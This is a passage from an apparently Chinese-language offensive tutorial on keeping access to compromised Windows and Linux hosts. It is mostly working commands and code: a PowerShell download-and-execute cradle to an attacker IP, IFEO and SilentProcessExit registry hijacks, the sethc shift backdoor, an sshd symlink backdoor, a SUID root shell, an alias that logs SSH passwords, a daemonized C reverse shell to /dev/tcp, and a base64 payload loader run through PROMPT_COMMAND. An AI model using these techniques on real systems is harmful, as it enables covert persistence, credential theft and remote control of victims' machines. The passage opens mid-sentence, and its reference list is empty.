user`或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。
    net user admin$ /del
###  PowerShell后门
**Empire框架**
> 
**Schtasks-Backdoor**
> 
**msf**
    use exploit/multi/script/web_delivery
    - 设置好参数后的powershell例子：
    powershell.exe  -ExecutionPolicy Bypass -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring('http://192.168.80.155:8888/');
###  注册表开机启动
在如下的注册表目录下注入键值`HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun`，可以实现开机自启动。以windows
defender为例:
###  映像劫持
> 细节参考：
涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。
    “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options”
大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是`debugger`,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。
    1. 找到注册表“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options”目录下的iexplore.exe
    2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:Windowssystem32calc.exe”
    3. 运行 iexplore.exe,bomb!!!
当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。
但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe
    reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe" /v GlobalFlag /t REG_DWORD /d 512
    reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe" /v ReportingMode /t REG_DWORD /d 1
    reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe" /v MonitorProcess /t REG_SZ /d  "C:Windowssystem32calc.exe"
###  shift后门
这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。
但是在windows
xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下：
    右键属性/安全/高级；
    所有者/编辑/添加当前用户/应用/确定；
    关闭窗口；
    右键属性/安全/编辑；
    选择Administrators（或者你的当前组）/勾选完全控制/确定；
## 0x04 linux权限维持
可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。
###  sshd软连接
> 原理细节： 
    victim
    ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;
    attack
    ssh root@x.x.x.x -p 5555
###  SUID Shell
root 权限下执行如下命令，普通用户运行`/dev/.rootshell`即可获得root权限
    cp /bin/bash /dev/.rootshell
    chmod u+s /dev/.rootshell
###  alias瞒天过海
我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例：
  1. 修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。 
        alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'
  2. 利用守护进程回弹shell 
        alias cat='cat&&/root/.shell'
shell.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define ERR_EXIT(m) 
    do
    {
        perror(m);
        exit(EXIT_FAILURE);
    }
    while (0);
    void creat_daemon(void);
    int main(void)
    {
        time_t t;
        int fd;
        creat_daemon();
        system("bash -i >& /dev/tcp/192.168.80.167/8080 0>&1");
        return 0;
    }
    void creat_daemon(void)
    {
        pid_t pid;
        int devnullfd,fd,fdtablesize;
        umask(0);
        pid = fork();
        if( pid == -1)
            ERR_EXIT("fork error");
        if(pid > 0 )
            exit(EXIT_SUCCESS);
        if(setsid() == -1)
            ERR_EXIT("SETSID ERROR");
        chdir("/");
        /* close any open file descriptors */
        for(fd = 0, fdtablesize = getdtablesize(); fd  
###  PROMPT_COMMAND后门
bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。
    export PROMPT_COMMAND="lsof -i:1025 &>/dev/null || (python -c "exec('encoded_payload'.decode('base64'))" 2>/dev/null &)"
当然也可以使用prompt_command进行提权,参考：
###  ssh免密后门
把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。
###  rootkit
rootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。
> 列表：
## 参考文献
[1]  
[2]  
[3]  
[4]  
[5]  
[6]  
[7]